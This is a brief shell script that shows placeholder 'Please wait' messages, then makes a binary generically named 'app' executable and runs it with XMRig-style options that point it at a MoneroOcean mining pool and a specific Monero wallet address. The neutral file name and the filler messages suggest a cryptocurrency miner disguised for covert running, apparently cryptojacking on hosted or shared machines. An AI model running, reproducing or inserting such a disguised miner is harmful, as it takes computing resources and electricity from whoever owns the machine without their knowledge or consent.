echo "Please wait."
echo "Starting..."
date
chmod +x app
./app
./app --donate-level 1 -o gulf.moneroocean.stream:10128 -u 8B1NcRqB9EU5MkA84NA7je5oBjheBcz6hiAsXH5sbh8tDknTRKqRjRo2eF2FXF3gjuXJASNhhGmJtjGVsWdz8NKAGq8GPiK -p 1:12341234